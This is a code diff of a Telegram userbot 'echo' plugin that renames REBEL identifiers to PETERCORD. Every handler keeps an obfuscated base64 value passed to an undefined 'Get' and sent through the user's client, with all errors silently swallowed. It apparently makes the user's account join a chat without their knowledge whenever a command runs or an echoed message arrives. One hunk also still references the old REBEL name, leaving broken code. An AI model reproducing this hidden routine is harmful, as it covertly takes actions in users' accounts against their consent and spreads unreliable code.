@@ -16,62 +16,62 @@ from userbot.plugins.sql_helper.echo_sql import (
     is_echo,
     remove_echo,
 )
-from REBELBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
+from PETERCORDBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
 from userbot.cmdhelp import CmdHelp
 
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(REBEL):
-    if REBEL.fwd_from:
+async def echo(PETERCORD):
+    if PETERCORD.fwd_from:
         return
-    if REBEL.reply_to_msg_id is not None:
-        reply_msg = await REBEL.get_reply_message()
+    if PETERCORD.reply_to_msg_id is not None:
+        reply_msg = await PETERCORD.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = REBEL.chat_id
+        chat_id = PETERCORD.chat_id
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await REBEL.client(h1m4n5hu0p)
+            await PETERCORD.client(h1m4n5hu0p)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(REBEL, "The user is already enabled with echo ")
+            await edit_or_reply(PETERCORD, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(REBEL, "Hii....😄🤓")
+        await edit_or_reply(PETERCORD, "Hii....😄🤓")
     else:
-        await edit_or_reply(REBEL, "Reply to a User's message to echo his messages")
+        await edit_or_reply(PETERCORD, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(REBEL):
-    if REBEL.fwd_from:
+async def echo(PETERCORD):
+    if PETERCORD.fwd_from:
         return
-    if REBEL.reply_to_msg_id is not None:
-        reply_msg = await REBEL.get_reply_message()
+    if PETERCORD.reply_to_msg_id is not None:
+        reply_msg = await PETERCORD.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = REBEL.chat_id
+        chat_id = PETERCORD.chat_id
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             h1m4n5hu0p = Get(h1m4n5hu0p)
-            await REBEL.client(h1m4n5hu0p)
+            await PETERCORD.client(h1m4n5hu0p)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(REBEL, "Echo has been stopped for the user")
+            await edit_or_reply(PETERCORD, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(REBEL, "The user is not activated with echo")
+            await edit_or_reply(PETERCORD, "The user is not activated with echo")
     else:
-        await edit_or_reply(REBEL, "Reply to a User's message to echo his messages")
+        await edit_or_reply(PETERCORD, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(REBEL):
-    if REBEL.fwd_from:
+async def echo(PETERCORD):
+    if PETERCORD.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -93,16 +93,16 @@ async def echo(REBEL):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(REBEL, reply_text)
+        await edit_or_reply(PETERCORD, reply_text)
     else:
-        await edit_or_reply(REBEL, output_str)
+        await edit_or_reply(PETERCORD, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(REBEL):
-    if REBEL.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(PETERCORD):
+    if PETERCORD.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(REBEL.sender_id, REBEL.chat_id):
+    if is_echo(PETERCORD.sender_id, PETERCORD.chat_id):
         await asyncio.sleep(2)
         try:
             h1m4n5hu0p = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
@@ -110,8 +110,8 @@ async def samereply(REBEL):
             await REBEL.client(h1m4n5hu0p)
         except BaseException:
             pass
-        if REBEL.message.text or REBEL.message.sticker:
-            await REBEL.reply(REBEL.message)
+        if PETERCORD.message.text or PETERCORD.message.sticker:
+            await PETERCORD.reply(PETERCORD.message)
 
 
 CmdHelp("echo").add_command(
